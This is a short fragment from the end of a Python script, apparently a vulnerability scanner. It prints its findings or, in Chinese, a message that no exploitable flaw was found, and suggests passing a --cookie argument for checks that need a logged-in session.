            safe_print(f"    {C.RED}[!] {h}{C.RST}")
    else:
        safe_print(f"\n  {C.CYN}未检测到可利用漏洞{C.RST}")
        safe_print(f"  {C.CYN}(可能已修复 / 版本不符 / 路径不同 / 需要 Cookie){C.RST}")
        if not args.cookie:
            safe_print(f"  {C.CYN}提示: 部分漏洞需要登录态, 可尝试 --cookie 参数{C.RST}")

    safe_print(f"{C.BLU}{'=' * 60}{C.RST}\n")


if __name__ == '__main__':
    main()
